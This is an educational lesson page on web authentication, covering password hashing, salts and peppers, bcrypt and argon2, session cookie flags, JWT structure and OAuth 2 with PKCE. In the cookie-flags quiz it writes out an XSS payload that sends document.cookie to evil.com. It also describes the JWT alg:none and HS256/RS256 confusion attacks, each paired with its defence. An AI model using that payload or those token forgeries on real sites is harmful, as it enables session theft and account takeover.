Recap — the hash + salt debate

Before we add anything new, let’s settle Part 1. Five questions on the whole password argument — commit out loud, then reveal. If these feel easy, the new material will land clean.

📁 Code for this section: this is Part-1 revision — its runnable proofs live in ../LLD-33-Authentication-1-AuthN-AuthZ-Tokens-BCrypt/code/ (01 encoding/hashing, 02 password eras, 03 timing)

A user clicks “Forgot password”. A teammate suggests: “we store sha256(password) — just reverse the stored hash and email them their old password back.” Why can’t we?

You can’t email back what you never kept.
  • Hashing throws information away (any input → 256 bits), so the database holds a fingerprint, not the password. There is no reverse function — not for you, not for an attacker. That’s exactly why real apps make you set a new password instead of recovering the old one.
  • The confusion is with encryption, which is reversible with a key. Passwords are hashed precisely so no such key exists to leak or misuse.
  • The upside: a breach of well-hashed passwords is survivable — the attacker also gets only fingerprints, not the passwords themselves.

Two users choose hunter2. Without a salt, their stored SHA-256 hashes are…

No salt → same password, same hash → a visible pattern.
  • SHA-256 is deterministic, so identical passwords produce identical hashes — a breach instantly reveals which users share a password, and one rainbow table cracks them all at once.
  • A unique random salt per user makes the two hashes differ, killing precomputed tables and hiding the shared-password pattern.
  • It is not harmless: password reuse across users (and sites) is exactly what attackers exploit first.

Where is the salt kept — and is it a secret?

Salt is public; its job isn’t secrecy.
  • The salt sits beside the hash (bcrypt even packs it inside the hash string). The attacker always has it — and that’s fine.
  • Salt’s job is to be unique, not secret: it defeats precomputed tables and forces the attacker to redo work per user. It does not slow a single guess.
  • A single shared/hard-coded salt (a “pepper” is different) brings back the shared-hash pattern — salts must be per-user and random.

🤔 Discuss — The salt is stored right beside the hash, so a stolen database already contains it. Could you add something the thief still wouldn’t have — a value that stays secret even when the whole DB leaks?

▼

Yes — it’s called a pepper. Same idea as salt, with one twist: it’s a single secret value kept outside the database (app config, an env var, or a KMS/HSM). Watch one users row — first without it, then with it:

Without a pepper — the leaked row is all the attacker needs:

users table  (LEAKED)
  user    salt (public)   password_hash
  alice   x7k2q9          $2b$12$x7k2q9....

  stored = bcrypt( salt + password )
  attacker has salt + hash  →  brute-force away on their GPUs

With a pepper — one secret lives where the DB dump can’t reach:

users table  (LEAKED)              app secret store  (NOT leaked)
  alice   x7k2q9   $2b$12$....         PEPPER = "Q9f!7zP..."   ← secret

  stored = bcrypt( salt + password + PEPPER )
  attacker has salt + hash  but NOT the pepper
  → every guess is  bcrypt(salt + guess + ?????)   →  stuck
  • Salt is per-user and public — it kills rainbow tables. Pepper is one value and secret — it makes a database-only leak useless.
  • To crack peppered hashes the attacker now needs two separate breaches — your database and your app’s secret store. That’s the whole win.
  • The catch: rotating a pepper is painful (every hash depends on it), so keep it in a KMS/HSM and change it rarely. Deeper dive: OWASP Password Storage Cheat Sheet — Peppering ↗.

Salt is handled. Why do we also insist on a deliberately slow hash?

Salt and slowness solve different halves.
  • Salt defeats precomputation; it does nothing about raw speed. A GPU still brute-forces a salted-but-fast hash in minutes.
  • A slow hash (bcrypt/argon2) makes one guess cost ~0.3 s — invisible to a user logging in once, ruinous to an attacker doing billions. That asymmetry is the whole game.
  • Output length is irrelevant — hashes are already irreversible; the defence is cost per attempt.

🔎 Hold on — where does the attacker try billions of guesses? Not on my login page…?

▼

Great instinct — there are two different attacks, and only one is the reason we hash slowly:

  • Online (on your live login form): the attacker POSTs guesses to /login. This is easy to stop — rate-limit the endpoint, lock the account after ~5 misses, add a CAPTCHA or MFA. They get a handful of tries, not billions. Slow hashing barely matters here.
  • Offline (the real threat): your database leaks — a dumped backup, SQL injection, an insider. Now the attacker copies the hash + salt to their own GPU rig and guesses locally. No login form, no rate limit, no lockout, and you can’t even see it happening. This is where ‘22 billion/sec’ lives.
  • So the defences split cleanly: rate-limiting stops online guessing; slow hashing + salt is your only defence once the hashes are in the attacker’s hands. You need both.

Your app integrates Stripe, so you hold a secret API key and must send it on every charge. You wouldn’t hash it (you’d never get it back) — so how do you store it at rest, and why?

It’s a secret you need back → encrypt, don’t hash.
  • Why encrypt: unlike a password (which you only ever compare), an API key must be used — sent verbatim to Stripe. Hashing is one-way, so it’s off the table; base64 is reversible by anyone, so it protects nothing. Encryption is the one tool that hides the value yet lets you get it back.
  • How, in practice: encrypt at rest with a key from a separate store — a KMS / HSM or an env-var key, never a column beside the ciphertext (that’s just a lock taped to its own key). Decrypt in memory only at call time, never log it, and rotate the key periodically. Better still: keep the raw key in a secrets manager (Vault, AWS Secrets Manager) and let the app fetch it.
  • You’ll see the same secret-handling discipline — API keys, shared secrets and HMAC webhook signatures — in this module’s Payments: Callbacks & Webhooks lesson ↗, where a leaked or mishandled key means real money moves.

bcrypt, properly

Part 1 argued why a slow hash wins. Now the real thing: the library you actually call, the hash string it returns, and the one knob that keeps you ahead of hardware.

📁 Code for this section: code/01_bcrypt_properly.py  ·  run pytest code/01_bcrypt_properly.py -v

🤔 Discuss first — You call bcrypt.hashpw(pw, bcrypt.gensalt(rounds=12)) and store a 60-character string. You stored the hash — but where did the salt go, and how does login work later without a separate salt column?

▼
  • The salt is generated by gensalt() and packed inside the returned string — no extra column needed.
  • At login, checkpw reads the salt (and cost) back out of the stored string, re-hashes your attempt with them, and compares.
  • So the one string is fully self-describing: version, cost, salt, and hash.

🧩 Anatomy of a bcrypt hash

$2b$12$Nf8s2Yl0k9wQ7bXcVe1uOeR3pHj5tK.../abcdEFGH
 │   │  └────────────────────┬───────────────────┘
 │   │        22 chars salt  +  31 chars hash
 │   └── cost = 12  (the work factor, 2^12 rounds)
 └────── 2b = bcrypt version
💬 What it does: Everything verification needs lives in the string: version, cost, salt, hash. That’s why bcrypt needs no separate salt column — and why you can raise the cost for new users without touching old rows.

🖥️ The whole API is two calls

import bcrypt

# at signup — store this string
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# at login — never decrypt; re-hash the attempt and compare (constant-time)
ok = bcrypt.checkpw(attempt.encode(), hashed)   # True / False
💬 What it does: There is no bcrypt.decrypt — the password never comes back. checkpw does the constant-time compare from Part 1 for you.

🧠 Wait — why password.encode()? Isn’t that the ‘encoding’ we said isn’t security?

▼
  • Different ‘encode’. This is Python’s str → bytes conversion, nothing to do with base64 or the encoding-vs-encryption debate. A Python str is abstract text (Unicode code points); .encode() turns it into the concrete UTF-8 bytes those characters are made of.
  • bcrypt (like all hashing) operates on raw bytes, not text — so it needs b"hunter2", not "hunter2". Modern bcrypt raises TypeError: Strings must be encoded before hashing if you forget. Verify with the same step: checkpw(attempt.encode(), stored).
  • Subtlety that ties back to the 72-byte cap: encoding is where length is really counted. Plain ASCII is 1 byte/char, but an accented letter or emoji is 2–4 bytes — so "pässwörd" eats more of the 72-byte budget than it looks.

⚙️ The cost factor is the whole trick

  • rounds=12 means 2¹² = 4,096 internal iterations, ~0.3 s per hash. Each +1 doubles the time — 13 is ~0.6 s, 14 is ~1.2 s.
  • This is adaptive security: when hardware gets faster, bump one integer and you’re ahead again — same algorithm, no migration.
  • 12 is a sane 2024 default for a web login; tune so a single hash is ~250–500 ms on your server.

🧠 What does “4,096 iterations” actually mean?

▼
  • bcrypt’s inner engine is an expensive key-setup step from the Blowfish cipher. The cost says how many times to repeat it: cost 12 → run it 2¹² = 4,096 times to produce one hash. It’s not ‘hash the result 4,096 times’ loosely — it’s 4,096 rounds of one deliberately slow operation.
  • That repetition is the cost: more iterations = more CPU spent per hash. A legit user pays it once (~0.3 s, invisible); an attacker pays it on every one of billions of guesses.
  • Because cost is the exponent (2cost), each +1 doubles the iterations — 12→13 goes 4,096→8,192, so ~0.3 s becomes ~0.6 s. That’s the ‘+1 doubles the time’ rule, from the inside.

🗺️ What actually happens — signup vs login

Same salt + same cost + same password → same hash. Login just recomputes and compares — it never decrypts anything.

the modern family

scrypt & argon2 — beyond CPU cost

bcrypt only makes the CPU work. But an attacker’s weapon is a GPU with thousands of tiny cores. The counter: also make each guess eat memory.

📁 Code for this section: code/02_argon2_and_the_family.py  ·  run pytest code/02_argon2_and_the_family.py -v

🤔 Discuss first — A GPU has ~10,000 cores, so it computes 10,000 bcrypt guesses at once. bcrypt can’t stop that — it only costs CPU time, which GPUs have in bulk. What else could you make each guess require, that a GPU can’t cheaply multiply by 10,000?

▼
  • Memory (RAM). Force each guess to allocate, say, 64 MB, and 10,000 parallel guesses need 640 GB — which no GPU has. That’s memory-hardness.
  • scrypt (2009) and argon2 (2015) are memory-hard by design; bcrypt is not.
  • This is why OWASP recommends argon2id first today, scrypt/bcrypt as solid alternatives.

🗺️ bcrypt vs argon2 — the one box that changes everything

Same shape as bcrypt — but the extra memory requirement is what a GPU can’t cheaply multiply by 10,000. That green box is the whole difference.

🖥️ argon2 in three lines

from argon2 import PasswordHasher
ph = PasswordHasher()               # sensible argon2id defaults
stored = ph.hash("correct horse")   # $argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>
ph.verify(stored, "correct horse")  # True, or raises VerifyMismatchError

# years later, after you raise the cost:
if ph.check_needs_rehash(stored):
    stored = ph.hash(password)       # upgrade this user on their next login
💬 What it does: Like bcrypt the hash is self-describing — but it encodes three costs: m (memory KiB), t (passes), p (parallel lanes). check_needs_rehash lets you migrate to stronger settings gradually.

🔑 Reading argon2’s three knobs — m, t, p

  • t (time): how many passes it makes over the memory — more passes, more CPU. This is bcrypt’s kind of cost.
  • m (memory): how much RAM every hash must fill — the space cost, the dimension bcrypt simply doesn’t have. It’s what makes a 10,000-core GPU useless: it has cores, not the memory to give each one.
  • p (parallelism): how many lanes run at once. It lets your multi-core server compute one hash a bit faster, while an attacker must still commit the full m of RAM per guess.

📏 What are KiB / MiB, and how do I read m?

  • KiB (kibibyte) = 1024 bytes; MiB (mebibyte) = 1024 KiB = 1,048,576 bytes. The ‘i’ means binary — powers of 1024, not the powers of 1000 in plain KB/MB. RAM is counted this way.
  • argon2’s m is written in KiB, so to read it in MiB just divide by 1024: m=65536 → 65536 ÷ 1024 = 64 MiB.

step 1 · staying logged in

What is a token, really?

Before we dive into JWTs, let’s build the story. You typed your password once. A second later, request #2 arrives — how does the server know it’s still you, without asking for the password again?

📁 Code for this section: code/demo_server.py — a live session-vs-JWT server  ·  run python3 code/demo_server.py

❓ The problem — HTTP forgets you the instant each request ends:

🤔 Discuss first — You log in at 9:00am. At 9:01 you click “my orders”, at 9:02 “my profile”. Each request arrives cold. So what do you attach to requests #2, #3, #4… to prove ‘I already logged in’?

▼

✅ The fix — attach a token the server can recognise:

  • After login the server hands you a token — a credential you attach to every later request that says ‘I’m already authenticated’.
  • You send it back each time (in a cookie or an Authorization header); the server checks it and knows who you are — no password re-entry.
  • The rest of today is really just two questions: what kind of token, and who issues it.

🔑 Two families of token

🗃️
Stateful — session
The server stores the truth (a session row in a DB/Redis) and hands you an opaque id. Every request, it looks the id up. Logout = delete the row → instant revocation.
🎫
Stateless — self-contained (JWT)
The token itself carries your signed claims. The server stores nothing — it just verifies the signature. Scales freely, but you can’t un-issue it before it expires.

🟩 Cookie vs session vs token — untangling the words

These three get mixed up constantly. They’re not competing choices — they answer different questions:

Click a row to reveal its cells — guess each first.

TermWhat it actually isQuestion it answers
🍪 Cookiea header the browser stores and auto-resendshow does the credential travel?
🎟️ Session idan opaque token backed by server-side statewhat do you hold? (a pointer)

❗ “Are session cookies tokens?” — yes. The session id inside the cookie is a bearer token (an opaque one); the cookie is merely the envelope it rides in. You can just as easily put a JWT in a cookie, or send a session id in an Authorization header. Cookie = transport; session-id / JWT = the token. Don’t compare “cookies vs tokens” — that’s comparing an envelope to a letter.

🍪 Session auth, start to finish — the simplest case

Let’s nail the stateful family on its own first (we’ll open up JWTs in the next section). The whole dance is: log in once, get a cookie, and let the browser re-send it automatically forever after.

🔍 See it yourself — the real cookie, and what every part means

▼

At login the server sends one header; from then on the browser adds a matching header to every request — automatically, with no JavaScript:

# the server sends this ONCE, in the login response:
Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600

# the browser then auto-adds this to EVERY later request to your site:
Cookie: sid=abc123

# "abc123" is opaque — it means nothing by itself. It just looks up
# your row in the server's session table:  { "abc123": "alice" }

🎯 Practical: what each cookie flag actually stops

Three real attacks, one flag each. Picture the attack, then reveal.

An attacker sneaks <script>fetch("evil.com?c="+document.cookie)</script> into a comment on your page (an XSS attack). Your session cookie was set with HttpOnly. Does the attacker get the session id?

HttpOnly hides the cookie from JavaScript.
  • HttpOnly tells the browser: never expose this cookie to JavaScript. The XSS script still runs, but document.cookie comes back without your sid — so it can’t be stolen and shipped to evil.com.
  • Important nuance: this limits the damage of XSS, it doesn’t excuse it — still fix the injection. HttpOnly is defence-in-depth for the token specifically.
  • This is why you saw sid missing from document.cookie in the console earlier — that was the protection working.

A user logs in over https://. Later a link opens a plain http:// page on the same site, over café wifi. With Secure set, is the session cookie sent on that http request — where a sniffer could grab it?

Secure = HTTPS-only, never plain http.
  • Secure pins the cookie to encrypted connections. On the plain http:// request the browser simply doesn’t attach it, so there’s nothing on the wire for a wifi eavesdropper to steal.
  • Without Secure, that one accidental http request would leak the session id in clear text — game over.
  • Rule: every auth cookie in production gets Secure (and your site should be HTTPS-only anyway).

You’re logged into your bank in one tab. In another, evil.com silently auto-submits a form to yourbank.com/transfer. With SameSite=Lax on the bank’s session cookie, does the browser attach it to that cross-site POST?

SameSite stops your cookie riding on other sites’ requests.
  • A CSRF attack abuses the fact that browsers normally attach your cookies to any request to a domain — even one triggered by another site. SameSite=Lax breaks that for cross-site POSTs, so the forged transfer isn’t authenticated.
  • Lax still sends the cookie when you click a normal link to the site (good UX); Strict is even tighter. Either way, the silent cross-site POST gets nothing.
  • SameSite is the modern, built-in layer of CSRF defence — on by default in current browsers.

A teammate says: “we should use tokens instead of cookies for auth.” What’s off about that sentence?

Cookie = how it travels. Token = what you hold.
  • A cookie is just an HTTP header the browser stores and auto-resends — a delivery mechanism. A token (an opaque session id, or a JWT) is the actual credential. They live on different axes.
  • Very common real setup: a JWT stored in an HttpOnly cookie — that’s a token and a cookie at once, no contradiction.
  • The real design questions are: stateful or stateless? (session vs JWT) and cookie or Authorization header? (transport) — two independent choices.

🎸 How you’d build session auth in Django — step by step

▼

Our demo_server.py hand-rolls it to show the moving parts. In a real app you rarely do that — Django ships session auth built in, and you mostly just use it:

  • 1. Middleware & apps (already on in a fresh project): keep django.contrib.sessions in INSTALLED_APPS, and in MIDDLEWARE keep SessionMiddleware then AuthenticationMiddleware — order matters (session before auth).
  • 2. Migrate: python manage.py migrate creates the django_session table — that’s your server-side session store (the equivalent of our in-memory dict).
  • 3. Log in: call login(request, user) after authenticate(…) — Django writes the session row and sets the sessionid cookie for you.
  • 4. Protect views: @login_required (from django.contrib.auth.decorators), or check request.user.is_authenticated. On DRF, add SessionAuthentication to DEFAULT_AUTHENTICATION_CLASSES and use the IsAuthenticated permission.
  • 5. Log out: logout(request) deletes the session — instant revocation, exactly like our demo’s logout button.
  • 6. Harden the cookie in settings.py: SESSION_COOKIE_HTTPONLY=True (default), SESSION_COOKIE_SECURE=True (HTTPS only), SESSION_COOKIE_SAMESITE="Lax", SESSION_COOKIE_AGE=1209600 (2 weeks). Swap to Redis with SESSION_ENGINE.
# views.py
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.http import JsonResponse

def login_view(request):
    user = authenticate(request, username=request.POST["username"],
                                 password=request.POST["password"])
    if user is not None:
        login(request, user)        # writes django_session row + sets sessionid cookie
        return JsonResponse({"ok": True})
    return JsonResponse({"ok": False}, status=401)

@login_required                     # no valid session -> redirect / 403
def me(request):
    return JsonResponse({"user": request.user.username})

def logout_view(request):
    logout(request)                 # deletes the session -> instant revoke
    return JsonResponse({"ok": True})
💬 What it does: Same three moves as demo_server.py: login() = our Set-Cookie + store, @login_required = our /session/me lookup, logout() = our revoke. Django just does the plumbing (the django_session table, the signed sessionid cookie, CSRF) for you.

step 2 · a stateless token

JWT / JWS in depth

Sessions work beautifully — on one server. Before we open up the JWT, let’s see the exact pain that made people want a stateless token in the first place.

📁 Code for this section: code/03_jwt_and_jws_deep.py — build & verify a JWT from scratch  ·  run pytest code/03_jwt_and_jws_deep.py -v

🤔 Discuss first — Your app gets popular, so you run it on five servers behind a load balancer, and a user’s requests bounce between them. With session auth, request #2 lands on a server that never saw the login. How does that server know who the user is — and what does that force you to build?

▼
  • Sessions live on the server, so every server must reach a shared session store (Redis/DB) and do a lookup on every request — a network hop each time, a bottleneck, and a single point of failure.
  • (Or you pin each user to one server — ‘sticky sessions’ — which breaks the moment that server restarts.)
  • A stateless token fixes it: the token carries the signed truth, so any server verifies it locally with just the secret — no shared store, no per-request lookup. Add servers freely.

⚖️ Why stateless? The scaling picture

  • Stateful (session): the truth lives in one shared store; every server, every request, does a lookup there. It works — but that store is now a bottleneck you must scale and protect.
  • Stateless (JWT): the truth rides inside the signed token; any server verifies it with the secret alone. No shared store, no lookup — ideal for many servers, microservices (one service issues, others verify independently), and mobile / third-party APIs.
  • The price: you can’t easily un-issue what you never stored — revocation is hard. That’s the access + refresh trade-off we’ll get to.

🧩 Microservices (service A → B → C)Stateless (JWT)each service verifies on its own — no central lookup on every hop
📱 Mobile app or SPA calling your APIStateless (JWT in Authorization)no cookies across origins; the token itself carries the claims
🔑 “Login with Google” / third-party (OIDC)Stateless (signed ID token = a JWT)the issuer signs it once; you verify offline, without calling Google per request
⚡ Huge traffic, short-lived sessionsStateless (JWT)the server stores nothing — no per-session storage or lookup cost
🤝 In practice, most big apps go hybrid: a stateless JWT access token (short expiry, scales freely) plus a small amount of state for revocation — a refresh token you can stop honouring, or a per-user token_version / denylist. You get stateless scaling and a practical kill-switch. Rule of thumb: need instant revocation or it’s a single server → session; need to scale out or go cross-service/cross-device → JWT.

🧩 Now, what’s inside one?

🤔 Discuss first — A JWT’s payload is just base64 — anyone holding the token can decode and read every claim. So is a JWT encrypted? And if not, what is the signature actually protecting?

▼
  • A JWT is signed, not encrypted — technically a JWS (JSON Web Signature). The payload is readable by anyone.
  • The signature protects integrity, not confidentiality: it proves the token wasn’t altered and came from someone holding the secret — it does not hide the contents.
  • So never put a secret (password, card, PII) in a JWT. Its encrypted cousin, JWE, exists but is rare; 99% of ‘JWT’ in the wild means JWS.

🧩 header . payload . signature

header    {"alg":"HS256","typ":"JWT"}                  → base64url  → eyJhbG...
payload   {"sub":"42","role":"admin","exp":1780...}    → base64url  → eyJzdWI...
signature HMAC_SHA256( header_b64 + "." + payload_b64, SECRET )    → K3f9...

token  =  eyJhbG
...  .  eyJzdWI...  .  K3f9...      (the three joined by dots)
💬 What it does: Anyone can read header & payload (base64 is not encryption). Only the server can produce a valid signature, because only it holds SECRET — so a forged or edited token fails verification.

🧠 So what’s the ‘algorithm’ here — encoding, encryption, or hashing?

▼

Remember Part 1’s three transforms? A JWT uses two of them — and never encryption:

  • header & payload → base64url ENCODING. Just a reversible re-spelling so the bytes ride safely in a URL. No key, no secrecy — anyone pastes them into jwt.io and reads them. (That’s why the payload is public.)
  • signature → HMAC-SHA256, a keyed HASH. One-way, using the server’s secret. It proves the token wasn’t altered and came from someone who holds the secret. It is not encryption — there is no ‘decrypt’ step anywhere.
  • So a normal JWT (a JWS) is encoding + hashing, zero encryption. That one fact explains all its behaviour: readable payload (encoding), tamper-proof (hash), but never put a secret inside (nothing is hidden).
  • The alg field just names that signature algorithm — HS256 = HMAC-SHA256. (An encrypted cousin, JWE, exists but is rarely used.)

🚨 Two attacks you must defend

💥 The alg: none attack

▼
  • An attacker takes a token, sets the header to {"alg":"none"}, drops the signature, and hopes the server ‘accepts an unsigned token’.
  • Defence: pin the algorithm server-side (algorithms=["HS256"]) and never trust the header’s alg. A real CVE that hit many libraries.

💥 The HS256/RS256 confusion attack

▼
  • With RS256 the token is signed by a private key and verified by a public one. If the server naively verifies with ‘the key’, an attacker can sign with HS256 using the public key as the HMAC secret.
  • Defence: again, pin the expected algorithm; symmetric (HS*) and asymmetric (RS*/ES*) verification must never be interchangeable.

🔄 The fix for “JWTs are hard to revoke”: access + refresh

▼
  • Access token — short-lived (15–60 min), sent on every API call. If stolen, it dies fast.
  • Refresh token — long-lived (days), sent only to /refresh to mint a new access token, so the user stays logged in.
  • Revoke by refusing to refresh (and keep a small deny-list / token-version for the short access window). This is what you’ll implement in Auth-3.

A teammate wants to store the user’s role AND their credit-card number in the JWT payload “to save a DB call.” Verdict?

Signed ≠ encrypted; put references, not secrets.
  • The role is fine (non-secret, and the signature stops tampering). The card number is effectively plaintext — anyone with the token base64-decodes it.
  • The signature proves integrity, it does not hide the payload. Confidentiality would need JWE (encryption).
  • Rule: put an id in the token and fetch secrets server-side. Non-secret claims (sub, role, exp) are exactly what JWTs are for.

step 3 · delegated login

OAuth 2 — access without the password

Sessions and JWTs are great when users log in to your site. OAuth solves a different problem: letting one app touch your data on another service — without ever handing over your password.

📁 Code for this section: code/04_oauth2_authorization_code_flow.py — the full dance + PKCE, simulated  ·  run pytest code/04_oauth2_authorization_code_flow.py -v

🤔 Discuss first — 😱 Set the scene. It’s 2006. A new app wants to “find your friends” by reading your Gmail contacts. The only way it knows to do that is… to ask for your Gmail password and log in as you. What could possibly go wrong — and what should happen instead?

▼
  • With your password, the app can do everything — read every email, change your password, delete the account — not just read contacts. And if they’re breached, your Gmail goes with them.
  • You also can’t revoke just that one app without changing your password (and breaking every other app you gave it to).
  • What we want: prove yourself to Google, and have Google hand the app a limited, revocable token — “read contacts, nothing else.” That is exactly what OAuth invented.

📜 Why OAuth exists — the password anti-pattern

You meet this every day, and the value is always the same — share access, never the password, scoped to exactly one job:

📚 A little history — OAuth 1 → 2 → OIDC

▼
  • 2006: Twitter’s Blaine Cook needs third-party apps to reach Twitter accounts without storing passwords — the ‘password anti-pattern’ above was rampant.
  • 2007: OAuth 1.0 — first open standard, but it made every request carry a hand-computed cryptographic signature. Powerful, but notoriously hard to implement correctly (a 2010 1.0a patched a session-fixation flaw).
  • 2012: OAuth 2.0 (RFC 6749) — a ground-up rewrite. It drops per-request signatures in favour of bearer tokens over TLS (HTTPS does the protecting), adds multiple ‘grant types’, and is what essentially everyone uses today.
  • 2014: OpenID Connect — a thin identity layer on top of OAuth 2 that adds an ID token (a JWT!). OAuth 2 alone grants authorization (‘what may this app do?’); OIDC adds authentication (‘who is this user?’) — which is what makes “Login with Google” a login.

In the pre-OAuth “dark ages,” an app that wanted to read your contacts asked for your actual email password. Beyond “it feels wrong,” what’s the concrete security problem?

Sharing a password shares everything, forever.
  • A password is an all-or-nothing, un-scoped, un-revocable credential. Handing it over grants full control and survives until you change it — and a breach of that app leaks your real password.
  • OAuth’s fix is a token that is scoped (read contacts only), revocable (kill it without touching your password), and expiring — damage is bounded by design.
  • ‘They promised to only read contacts’ is trust, not enforcement — the whole point is to make the protocol enforce least privilege.

👤 So how does the token get issued? Discuss first…

🤔 Discuss first — You click “Login with Google” on a random app and it logs you in — yet you never typed your Google password into that app. So how did the app learn who you are, and what exactly did Google give it?

▼
  • You authenticate with Google, not with the app. Google asks you to consent, then hands the app a short-lived code it swaps for an access token.
  • The app uses that token to read only the data you consented to (e.g. name + email) — never your password.
  • The valet-key analogy: a key that drives the car but won’t open the trunk. Limited, revocable access.

🔄 The Authorization Code flow (with PKCE)

  • 1. Redirect. App sends you to Google with its client_id, the scope it wants (e.g. profile email), and a PKCE challenge (the SHA-256 of a secret it keeps).
  • 2. Consent. Google authenticates you and shows “App X wants: your name, email. Allow?” You approve.
  • 3. Code. Google redirects back to the app with a short-lived, single-use authorization code.
  • 4. Exchange. The app’s server swaps code + the PKCE verifier for an access token (a back-channel call — never in the browser).
  • 5. Access. The app calls Google’s API with the token and gets only the consented data.

🧩 Why PKCE? — and why a code instead of a token up front

▼
  • The short-lived code travels through the browser (a redirect), where it could be intercepted. The valuable token is only ever handed over on the server-to-server exchange.
  • PKCE (Proof Key for Code Exchange): the app invents a secret verifier, sends only its SHA-256 challenge in step 1, and must present the original verifier in step 4. A stolen code is useless without the verifier — SHA-256(attacker’s guess) ≠ challenge.
  • Every modern web/mobile app should use Authorization Code + PKCE. (The old ‘implicit flow’ that returned a token in the URL is deprecated.)
💡 OAuth vs OpenID Connect: OAuth 2 grants authorization (access to data). OIDC is a thin layer on top that adds an ID token (a JWT!) so the app learns who you are — that’s the “login” in “login with Google”. JWT and OAuth meet here.

What does OAuth 2 fundamentally let you avoid sharing?

Delegated access without handing over the password.
  • The app never sees your Google password; you authenticate with Google, which vouches for you via a token scoped to what you consented to.
  • You do share data — but only the consented scope, and you can revoke the app’s access anytime from your Google account.
  • You’re not anonymous to Google — that’s the point; Google knows it’s you and tells the app just enough.

🤔 Discuss first — 🧵 Auth-4 — So far we were the app logging in with Google. What flips when you must become the provider — when other apps “Login with us”?

▼

  • You must verify PKCE, enforce scopes, make codes single-use and short-lived, and sign the tokens/ID-tokens you hand out.
  • Everything today — hashing (client secrets), JWT (the tokens you issue), the code+PKCE flow — comes back, now from the other side of the table.

🤔 Discuss first — 🧵 Design tension — A user clicks “log out everywhere”. With stateless JWTs that are valid until exp, how do you honour it immediately?

▼
  • Short access-token lifetimes + a refresh step give you a natural choke point: stop refreshing.
  • For instant global logout you add a little state back: a per-user token_version (bump it → all old tokens invalid) or a small deny-list keyed by token id.
  • The lesson: ‘stateless’ is a spectrum — you trade a bit of state back for the revocation you need. You’ll make this exact call in Auth-3.
